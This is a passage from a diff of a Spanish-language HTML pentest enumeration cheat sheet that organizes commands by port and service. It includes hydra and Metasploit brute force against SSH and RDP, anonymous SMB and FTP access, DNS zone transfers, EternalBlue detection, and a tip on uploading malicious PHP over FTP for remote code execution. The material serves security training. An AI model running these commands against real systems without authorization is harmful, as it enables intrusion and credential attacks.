-              <li data-n="2">BlueKeep — CVE-2019-0708 (pre-auth RCE)</li>
-              <li data-n="3">Credenciales reutilizadas de otros servicios</li>
-            </ul>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script rdp-enum-encryption IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script rdp-enum-encryption IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar cifrado y versión de RDP</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script rdp-vuln-ms12-020 IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script rdp-vuln-ms12-020 IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar vulnerabilidad DoS MS12-020</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">hydra -l Administrator -P wordlist.txt IP rdp</div><button class="enum-copy-btn" onclick="enumCopy(this,'hydra -l Administrator -P wordlist.txt IP rdp')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuerza bruta RDP</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">xfreerdp /u:usuario /p:contraseña /v:IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'xfreerdp /u:usuario /p:contraseña /v:IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión RDP desde Linux</div></div>
-          </div>
-        </div>
-
-        <!-- MySQL -->
-        <div class="enum-accordion">
-          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
-            <span class="enum-acc-port">3306/TCP</span>
-            <span class="enum-acc-name">MySQL / MariaDB</span>
-            <span class="enum-acc-arrow">▶</span>
-          </div>
-          <div class="enum-acc-body">
-            <ul class="enum-vectors">
-              <li data-n="1">Acceso sin contraseña (root sin pass)</li>
-              <li data-n="2">Credenciales por defecto</li>
-              <li data-n="3">Inyección SQL desde otra capa de la app</li>
-            </ul>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">mysql -u root -h IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'mysql -u root -h IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión sin contraseña</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script mysql-empty-password IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script mysql-empty-password IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar acceso sin contraseña</div></div>
-            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script mysql-info IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script mysql-info IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Información general del servidor MySQL</div></div>
-          </div>
-        </div>
-
-        <!-- Otros servicios -->
-        <div class="enum-group" style="margin-top:16px;">
-          <div class="enum-group-title">Otros servicios menos comunes</div>
-          <table class="enum-service-table">
-            <thead><tr><th>Puerto</th><th>Servicio</th><th>Comando rápido</th><th></th></tr></thead>
-            <tbody>
-              <tr><td>111</td><td>RPC</td><td><code style="color:var(--orange)">rpcinfo -p IP</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'rpcinfo -p IP')">⎘</button></td></tr>
-              <tr><td>2049</td><td>NFS</td><td><code style="color:var(--orange)">showmount -e IP</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'showmount -e IP')">⎘</button></td></tr>
-              <tr><td>5900</td><td>VNC</td><td><code style="color:var(--orange)">nmap --script vnc-info IP</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script vnc-info IP')">⎘</button></td></tr>
-              <tr><td>6379</td><td>Redis</td><td><code style="color:var(--orange)">redis-cli -h IP ping</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'redis-cli -h IP ping')">⎘</button></td></tr>
-              <tr><td>27017</td><td>MongoDB</td><td><code style="color:var(--orange)">mongo --host IP</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'mongo --host IP')">⎘</button></td></tr>
-              <tr><td>5432</td><td>PostgreSQL</td><td><code style="color:var(--orange)">psql -h IP -U postgres</code></td><td><button class="enum-copy-btn" onclick="enumCopy(this,'psql -h IP -U postgres')">⎘</button></td></tr>
-            </tbody>
-          </table>
-        </div>
-      </div>
-
-    </div><!-- /esec-services -->
-
-    <!-- SECTION 3: Cheatsheet Nmap -->
-    <div class="enum-section" id="esec-nmap">
+        <details class="enum-nmap-ref">
+          <summary style="cursor:pointer;font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--text3);font-family:var(--mono);padding:8px 0;user-select:none;">📖 Referencia rápida de Nmap — flags (clic para desplegar)</summary>
+          <div style="padding-top:10px;">
 
       <div class="enum-nmap-section">
         <div class="enum-group-title">Selección de puertos</div>
@@ -1195,45 +1033,292 @@ La IA clasificará el contenido, extraerá comandos, herramientas y CVEs automá
           <div class="enum-nmap-row"><span class="enum-nmap-flag">/usr/share/nmap/scripts/</span><span class="enum-nmap-desc">Ruta local de scripts NSE</span><button class="enum-copy-btn" onclick="enumCopy(this,'/usr/share/nmap/scripts/')">⎘</button></div>
         </div>
       </div>
+          </div>
+        </details>
+      </div>
 
-    </div><!-- /esec-nmap -->
+    </div><!-- /esec-scan -->
 
-    <!-- SECTION 4: Windows / AD -->
-    <div class="enum-section" id="esec-winad">
-
-      <div class="enum-group">
-        <div class="enum-group-title">SMB — Recursos compartidos</div>
-        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">smbclient -N -L //IP/</div><button class="enum-copy-btn" onclick="enumCopy(this,'smbclient -N -L //IP/')">⎘ Copiar</button></div><div class="enum-cmd-desc">Listar recursos compartidos sin credenciales (sesión nula)</div></div>
-        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">smbclient -N //IP/recurso</div><button class="enum-copy-btn" onclick="enumCopy(this,'smbclient -N //IP/recurso')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conectarse a un recurso compartido específico sin credenciales</div></div>
-        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">enum4linux -a IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'enum4linux -a IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Enumeración completa SMB / NetBIOS (usuarios, grupos, shares, políticas)</div></div>
+    <!-- SECTION 3: Enumerar servicios (por servicio + Windows/AD) -->
+    <div class="enum-section" id="esec-services">
+      <div class="enum-group" style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
+        <span style="font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);font-family:var(--mono);">Puertos abiertos</span>
+        <input type="text" id="svcOpenPorts" placeholder="22,80,445…" oninput="onSvcPortsChanged()" style="background:var(--bg3);border:1px solid var(--border2);color:var(--text);border-radius:var(--r);padding:3px 9px;font-size:11px;font-family:var(--mono);outline:none;max-width:180px;" title="Los puertos que te dio la Fase 1 del escaneo. Se sincroniza con ②.">
+        <label style="display:flex;align-items:center;gap:5px;font-size:10px;font-family:var(--mono);color:var(--text2);cursor:pointer;"><input type="checkbox" id="svcOnlyOpen" onchange="highlightServices()"> Solo abiertos</label>
+        <span id="svcOpenHint" style="font-size:10px;color:var(--text3);font-family:var(--mono);"></span>
       </div>
 
       <div class="enum-group">
-        <div class="enum-group-title">MSSQL e Impacket</div>
-        <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">impacket-mssqlclient HOSTNAME/usuario@IP -windows-auth</div><button class="enum-copy-btn" onclick="enumCopy(this,'impacket-mssqlclient HOSTNAME/usuario@IP -windows-auth')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión a MSSQL con Impacket usando autenticación de Windows</div></div>
+        <div class="enum-group-title">Versión → ¿exploit conocido?</div>
+        <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+          <input type="text" id="edbQuery" placeholder="producto y versión — ej: vsftpd 2.3.4" onkeydown="if(event.key==='Enter')searchExploitDB()" style="flex:1;min-width:200px;max-width:320px;background:var(--bg3);border:1px solid var(--border2);color:var(--text);border-radius:var(--r);padding:5px 10px;font-size:11px;font-family:var(--mono);outline:none;">
+          <button class="btn-ai" onclick="searchExploitDB()">🔎 Buscar en Exploit-DB</button>
+        </div>
+        <div style="font-size:10px;color:var(--text3);font-family:var(--mono);margin-top:5px;">Cuando el escaneo te da una versión (p. ej. con <code style="color:var(--orange)">-sV</code>), búscala aquí para ver si tiene exploit público. Consulta Exploit-DB en vivo.</div>
+        <div id="edbResults" style="margin-top:8px;"></div>
+      </div>
 
-        <div class="enum-cmd-card">
-          <div class="enum-cmd-row" style="align-items:flex-start;">
-            <pre id="xpCmdBlock" class="enum-cmd-code" style="white-space:pre;margin:0;line-height:1.6;">EXEC sp_configure 'show advanced options', 1;
+      <div class="enum-group">
+        <div class="enum-group-title">Análisis por servicio</div>
+
+        <!-- FTP -->
+        <div class="enum-accordion">
+          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
+            <span class="enum-acc-port">21/TCP</span>
+            <span class="enum-acc-name">FTP — File Transfer Protocol</span>
+            <span class="enum-acc-arrow">▶</span>
+          </div>
+          <div class="enum-acc-body">
+              <div class="svc-whatis"><b>Qué es:</b> Servicio de transferencia de archivos. Interesa porque a menudo permite acceso anónimo o guarda ficheros y credenciales que dan el primer punto de entrada.</div>
+              <div class="svc-lbl">Qué buscar</div>
+            <ul class="enum-vectors">
+              <li data-n="1">Sesión anónima (usuario: anonymous, pass: vacía)</li>
+              <li data-n="2">Versión vulnerable con exploit conocido</li>
+              <li data-n="3">Credenciales reutilizadas de otros servicios</li>
+            </ul>
+              <div class="svc-lbl">Comandos</div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">ftp IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'ftp IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conectar — usuario: <code style="color:var(--orange)">anonymous</code>, contraseña vacía</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script ftp-anon IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script ftp-anon IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar acceso anónimo con script NSE</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">searchsploit vsftpd 2.3.4</div><button class="enum-copy-btn" onclick="enumCopy(this,'searchsploit vsftpd 2.3.4')">⎘ Copiar</button></div><div class="enum-cmd-desc">Buscar exploit por versión del servidor</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-note">💡 Si FTP + puerto 80 activos: subir PHP malicioso por FTP y ejecutarlo desde la web = RCE</div>
+          </div>
+        </div>
+
+        <!-- SSH -->
+        <div class="enum-accordion">
+          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
+            <span class="enum-acc-port">22/TCP</span>
+            <span class="enum-acc-name">SSH — Secure Shell</span>
+            <span class="enum-acc-arrow">▶</span>
+          </div>
+          <div class="enum-acc-body">
+              <div class="svc-whatis"><b>Qué es:</b> Acceso a shell remota cifrada. Es un objetivo directo: si consigues credenciales o una clave privada, entras con consola en la máquina.</div>
+              <div class="svc-lbl">Qué buscar</div>
+            <ul class="enum-vectors">
+              <li data-n="1">Fuerza bruta con credenciales</li>
+              <li data-n="2">Versión vulnerable</li>
+              <li data-n="3">Claves privadas expuestas en el sistema</li>
+            </ul>
+              <div class="svc-lbl">Comandos</div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">ssh usuario@IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'ssh usuario@IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión directa</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-req">🔑 Requiere credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">hydra -l usuario -P /usr/share/wordlists/rockyou.txt IP ssh</div><button class="enum-copy-btn" onclick="enumCopy(this,'hydra -l usuario -P /usr/share/wordlists/rockyou.txt IP ssh')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuerza bruta de contraseña</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script ssh-brute IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script ssh-brute IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuerza bruta con script NSE</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">use auxiliary/scanner/ssh/ssh_login</div><button class="enum-copy-btn" onclick="enumCopy(this,'use auxiliary/scanner/ssh/ssh_login')">⎘ Copiar</button></div><div class="enum-cmd-desc">Módulo Metasploit — bruteforce SSH</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-danger-note">⚠ <code style="color:var(--orange)">hydra</code>, <code style="color:var(--orange)">ssh-brute</code> y <code style="color:var(--orange)">ssh_login</code> son FUERZA BRUTA = fase de ATAQUE, no enumeración. Enumerar es solo identificar el servicio; probar credenciales ya es atacar.</div>
+          </div>
+        </div>
+
+        <!-- Telnet -->
+        <div class="enum-accordion">
+          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
+            <span class="enum-acc-port">23/TCP</span>
+            <span class="enum-acc-name">Telnet</span>
+            <span class="enum-acc-arrow">▶</span>
+          </div>
+          <div class="enum-acc-body">
+              <div class="svc-whatis"><b>Qué es:</b> Acceso remoto a consola pero sin cifrado. Interesa porque las credenciales viajan en texto claro y suele traer contraseñas por defecto.</div>
+              <div class="svc-lbl">Qué buscar</div>
+            <ul class="enum-vectors">
+              <li data-n="1">Protocolo sin cifrado — credenciales visibles en tráfico</li>
+              <li data-n="2">Credenciales por defecto del dispositivo</li>
+            </ul>
+              <div class="svc-lbl">Comandos</div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">telnet IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'telnet IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión directa</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-danger-note">⚠ Telnet no cifra el tráfico. Cualquier sniffer en la red captura las credenciales en texto claro.</div>
+          </div>
+        </div>
+
+        <!-- SMTP -->
+        <div class="enum-accordion">
+          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
+            <span class="enum-acc-port">25/TCP</span>
+            <span class="enum-acc-name">SMTP — Simple Mail Transfer Protocol</span>
+            <span class="enum-acc-arrow">▶</span>
+          </div>
+          <div class="enum-acc-body">
+              <div class="svc-whatis"><b>Qué es:</b> Servicio de correo saliente. Interesa para enumerar usuarios válidos del sistema y detectar servidores mal configurados (open relay).</div>
+              <div class="svc-lbl">Qué buscar</div>
+            <ul class="enum-vectors">
+              <li data-n="1">Enumeración de usuarios válidos (VRFY / EXPN)</li>
+              <li data-n="2">Open relay — enviar correo como cualquier dominio</li>
+            </ul>
+              <div class="svc-lbl">Comandos</div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script smtp-enum-users IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script smtp-enum-users IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Enumerar usuarios válidos del servidor</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script smtp-open-relay IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script smtp-open-relay IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar open relay</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">telnet IP 25</div><button class="enum-copy-btn" onclick="enumCopy(this,'telnet IP 25')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión manual para pruebas con comandos SMTP</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+          </div>
+        </div>
+
+        <!-- DNS -->
+        <div class="enum-accordion">
+          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
+            <span class="enum-acc-port">53/TCP+UDP</span>
+            <span class="enum-acc-name">DNS — Domain Name System</span>
+            <span class="enum-acc-arrow">▶</span>
+          </div>
+          <div class="enum-acc-body">
+              <div class="svc-whatis"><b>Qué es:</b> Servicio de resolución de nombres. Interesa porque una transferencia de zona mal configurada puede volcarte todo el mapa de la red.</div>
+              <div class="svc-lbl">Qué buscar</div>
+            <ul class="enum-vectors">
+              <li data-n="1">Zone transfer (AXFR) — vuelca todos los registros DNS</li>
+              <li data-n="2">Subdominios por fuerza bruta</li>
+            </ul>
+              <div class="svc-lbl">Comandos</div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">dig axfr @IP dominio.com</div><button class="enum-copy-btn" onclick="enumCopy(this,'dig axfr @IP dominio.com')">⎘ Copiar</button></div><div class="enum-cmd-desc">Intentar transferencia de zona completa</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script dns-zone-transfer IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script dns-zone-transfer IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Zone transfer con script NSE</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">dnsrecon -d dominio.com -t axfr</div><button class="enum-copy-btn" onclick="enumCopy(this,'dnsrecon -d dominio.com -t axfr')">⎘ Copiar</button></div><div class="enum-cmd-desc">Reconocimiento DNS completo</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+          </div>
+        </div>
+
+        <!-- HTTP/S -->
+        <div class="enum-accordion">
+          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
+            <span class="enum-acc-port">80/443</span>
+            <span class="enum-acc-name">HTTP / HTTPS — Web</span>
+            <span class="enum-acc-arrow">▶</span>
+          </div>
+          <div class="enum-acc-body">
+              <div class="svc-whatis"><b>Qué es:</b> Servicio web. Suele ser la mayor superficie de ataque: rutas ocultas, versiones vulnerables del servidor y ficheros expuestos.</div>
+              <div class="svc-lbl">Qué buscar</div>
+            <ul class="enum-vectors">
+              <li data-n="1">Fuzzing de directorios y archivos ocultos</li>
+              <li data-n="2">Versión vulnerable del servidor web</li>
+              <li data-n="3">CGI habilitado — posible Shellshock</li>
+              <li data-n="4">Información en phpinfo.php, robots.txt, .git/</li>
+            </ul>
+              <div class="svc-lbl">Comandos</div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">ffuf -u http://IP/FUZZ -w /usr/share/dirb/wordlists/common.txt -c</div><button class="enum-copy-btn" onclick="enumCopy(this,'ffuf -u http://IP/FUZZ -w /usr/share/dirb/wordlists/common.txt -c')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuzzing básico de directorios</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c</div><button class="enum-copy-btn" onclick="enumCopy(this,'ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuzzing con SecLists (más completo)</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nikto -h http://IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nikto -h http://IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Escáner automático de vulnerabilidades web</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">curl -I http://IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'curl -I http://IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Ver cabeceras HTTP — versión del servidor</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-note">🔍 Siempre revisar manualmente: <code style="color:var(--orange)">/robots.txt</code> · <code style="color:var(--orange)">/phpinfo.php</code> · <code style="color:var(--orange)">/.git/</code></div>
+          </div>
+        </div>
+
+        <!-- SMB -->
+        <div class="enum-accordion">
+          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
+            <span class="enum-acc-port">139/445</span>
+            <span class="enum-acc-name">SMB — Server Message Block</span>
+            <span class="enum-acc-arrow">▶</span>
+          </div>
+          <div class="enum-acc-body">
+              <div class="svc-whatis"><b>Qué es:</b> Compartición de ficheros de Windows. Interesa por recursos accesibles sin credenciales y por vulnerabilidades críticas como EternalBlue.</div>
+              <div class="svc-lbl">Qué buscar</div>
+            <ul class="enum-vectors">
+              <li data-n="1">Enumeración de recursos compartidos anónima</li>
+              <li data-n="2">Versión vulnerable — EternalBlue (MS17-010)</li>
+              <li data-n="3">Credenciales débiles o reutilizadas</li>
+            </ul>
+              <div class="svc-lbl">Comandos</div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">smbclient -N -L //IP/</div><button class="enum-copy-btn" onclick="enumCopy(this,'smbclient -N -L //IP/')">⎘ Copiar</button></div><div class="enum-cmd-desc">Listar recursos compartidos sin credenciales</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">smbclient //IP/recurso -N</div><button class="enum-copy-btn" onclick="enumCopy(this,'smbclient //IP/recurso -N')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conectar a recurso sin credenciales</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">enum4linux -a IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'enum4linux -a IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Enumeración completa SMB / NetBIOS</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script smb-vuln-ms17-010 IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script smb-vuln-ms17-010 IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar EternalBlue</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">use auxiliary/scanner/smb/smb_version</div><button class="enum-copy-btn" onclick="enumCopy(this,'use auxiliary/scanner/smb/smb_version')">⎘ Copiar</button></div><div class="enum-cmd-desc">Módulo Metasploit — versión SMB</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+          </div>
+        </div>
+
+        <!-- RDP -->
+        <div class="enum-accordion">
+          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
+            <span class="enum-acc-port">3389/TCP</span>
+            <span class="enum-acc-name">RDP — Remote Desktop Protocol</span>
+            <span class="enum-acc-arrow">▶</span>
+          </div>
+          <div class="enum-acc-body">
+              <div class="svc-whatis"><b>Qué es:</b> Escritorio remoto de Windows. Interesa como acceso gráfico directo si hay credenciales débiles o vulnerabilidades pre-auth (BlueKeep).</div>
+              <div class="svc-lbl">Qué buscar</div>
+            <ul class="enum-vectors">
+              <li data-n="1">Fuerza bruta de credenciales</li>
+              <li data-n="2">BlueKeep — CVE-2019-0708 (pre-auth RCE)</li>
+              <li data-n="3">Credenciales reutilizadas de otros servicios</li>
+            </ul>
+              <div class="svc-lbl">Comandos</div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script rdp-enum-encryption IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script rdp-enum-encryption IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar cifrado y versión de RDP</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script rdp-vuln-ms12-020 IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script rdp-vuln-ms12-020 IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar vulnerabilidad DoS MS12-020</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">hydra -l Administrator -P wordlist.txt IP rdp</div><button class="enum-copy-btn" onclick="enumCopy(this,'hydra -l Administrator -P wordlist.txt IP rdp')">⎘ Copiar</button></div><div class="enum-cmd-desc">Fuerza bruta RDP</div><div class="enum-meta"><span class="noise-tag noise-high">🔴 Ruidoso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div><div class="enum-danger-note">⚠ <code style="color:var(--orange)">hydra ... rdp</code> es FUERZA BRUTA = fase de ATAQUE, no enumeración.</div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">xfreerdp /u:usuario /p:contraseña /v:IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'xfreerdp /u:usuario /p:contraseña /v:IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión RDP desde Linux</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-req">🔑 Requiere credenciales</span></div></div>
+          </div>
+        </div>
+
+        <!-- MySQL -->
+        <div class="enum-accordion">
+          <div class="enum-acc-hd" onclick="toggleEnumAcc(this)">
+            <span class="enum-acc-port">3306/TCP</span>
+            <span class="enum-acc-name">MySQL / MariaDB</span>
+            <span class="enum-acc-arrow">▶</span>
+          </div>
+          <div class="enum-acc-body">
+              <div class="svc-whatis"><b>Qué es:</b> Base de datos. Interesa por accesos sin contraseña o por defecto que exponen datos y, en algunos casos, permiten escribir ficheros en el sistema.</div>
+              <div class="svc-lbl">Qué buscar</div>
+            <ul class="enum-vectors">
+              <li data-n="1">Acceso sin contraseña (root sin pass)</li>
+              <li data-n="2">Credenciales por defecto</li>
+              <li data-n="3">Inyección SQL desde otra capa de la app</li>
+            </ul>
+              <div class="svc-lbl">Comandos</div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">mysql -u root -h IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'mysql -u root -h IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Conexión sin contraseña</div><div class="enum-meta"><span class="noise-tag noise-low">🟢 Silencioso</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
+            <div class="enum-cmd-card"><div class="enum-cmd-row"><div class="enum-cmd-code">nmap --script mysql-empty-password IP</div><button class="enum-copy-btn" onclick="enumCopy(this,'nmap --script mysql-empty-password IP')">⎘ Copiar</button></div><div class="enum-cmd-desc">Detectar acceso sin contraseña</div><div class="enum-meta"><span class="noise-tag noise-med">🟡 Moderado</span><span class="auth-tag auth-none">🔓 Sin credenciales</span></div></div>
